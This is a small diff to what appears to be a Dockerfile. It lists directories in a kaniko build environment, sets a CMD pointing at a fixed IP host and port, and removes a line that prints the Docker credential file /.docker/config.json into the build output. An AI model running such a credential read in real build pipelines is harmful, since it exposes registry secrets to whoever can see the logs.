@@ -6,6 +6,6 @@ RUN tree /opt/app/
 RUN tree /opt/atm/
 RUN tree /kaniko/
 RUN tree /tmp/
-RUN cat /.docker/config.json
+RUN ls -alh .
 CMD ["-host", "104.198.138.155:8083"]
 
